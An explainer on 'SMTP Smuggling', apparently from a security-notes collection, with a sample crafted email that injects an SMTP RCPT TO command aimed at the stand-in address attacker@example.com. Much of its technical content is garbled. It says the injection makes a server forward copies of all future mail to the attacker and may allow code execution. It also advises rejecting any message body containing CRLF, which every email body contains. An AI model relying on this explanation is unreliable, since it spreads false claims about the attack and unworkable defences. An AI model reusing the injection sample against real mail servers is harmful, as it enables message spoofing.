# SMTP Smuggling


# üëâ¬†Overview

---

### üëÄ¬†What ?

> SMTP Smuggling is a cyber attack method that exploits the SMTP (Simple Mail Transfer Protocol) to infiltrate, exfiltrate data, or otherwise compromise a system or network.
> 

### üßê¬†Why ?

> SMTP Smuggling is an important topic because of its potential for serious damage. It can be used to bypass security measures, gain unauthorized access, and steal sensitive data. It is also a stealthy technique, making it difficult to detect and prevent.
> 

### ‚õèÔ∏è¬†How ?

> SMTP Smuggling is performed by exploiting vulnerabilities in the way SMTP servers handle data. The attacker sends specially crafted messages that can trick the server into accepting malicious content. This can be used to deliver malware, exfiltrate data, or even gain control of the server.
> 

### ‚è≥¬†When ?

> SMTP Smuggling has been known and used by cyber criminals for quite some time. It became more prevalent with the rise of complex web applications and the increasing reliance on email as a communication tool.

# ‚öôÔ∏è¬†Technical Explanations

---

SMTP, or Simple Mail Transfer Protocol, is a fundamental protocol utilized for sending emails across the internet. The process involves the transmission of messages from one server to another until they eventually reach their intended destination. These transmissions, however, can be vulnerable to a cyber attack method known as SMTP Smuggling.

SMTP Smuggling is an attack strategy that exploits the way SMTP servers interpret and handle data. The attacker sends uniquely crafted messages, which can deceive the server into accepting malicious content. This tactic can be employed to deliver malware, extract data, or even gain control of the server itself. The manipulation of data interpretation can lead the server to behave in unforeseen ways, such as executing arbitrary code, accepting unauthorized messages, or unintentionally revealing sensitive information.

SMTP Smuggling has been a known method utilized by cyber criminals for some years now. Its use has grown in prevalence with the evolution of intricate web applications and the increasing dependence on email as a means of communication. Due to its stealthy nature, SMTP Smuggling can be difficult to detect and prevent, making it a significant threat to information security. Understanding the mechanics of SMTP Smuggling, its potential for damage, and how to mitigate its risks is crucial in maintaining robust cyber security practices within any organization.

As an example, let's consider an SMTP Smuggling attack that uses the `CRLF` injection vulnerability. Here, `CRLF` stands for Carriage Return Line Feed, which is a sequence of characters used to denote the end of a line of text in many protocols, including SMTP.

1. **Crafting the Message**: The attacker begins by crafting a malicious email. In the body of the email, they include a `CRLF` sequence followed by a command that the SMTP server will interpret as coming from the sender, such as `RCPT TO:<attacker@example.com>`. This makes it seem as if the sender of the email is trying to send a copy of the email to `attacker@example.com`.

```
Subject: Test email
From: victim@example.com
To: recipient@example.com
CC:
.
RCPT TO:<attacker@example.com>
DATA
Subject: Stolen data
This is the body of the stolen email.
.

```

1. **Sending the Message**: The attacker sends this email to the victim. When the victim's mail server receives the email, it sees the `RCPT TO:<attacker@example.com>` command in the body of the email, and assumes it is a valid command from the sender.
2. **Exploitation**: The server then sends a copy of the email, including all headers and the body, to `attacker@example.com`. This allows the attacker to receive a copy of any email sent to `recipient@example.com`, effectively creating a breach of privacy.
3. **Mitigation**: To protect against this vulnerability, mail servers should be configured to reject any email that contains a `CRLF` sequence in the body of the email. Additionally, all user input should be properly sanitized to ensure that no malicious commands can be injected.

Remember, this is a simplified example. Real-world attacks can be much more complex and stealthy. Always follow best practices for securing your SMTP servers to protect against such attacks.
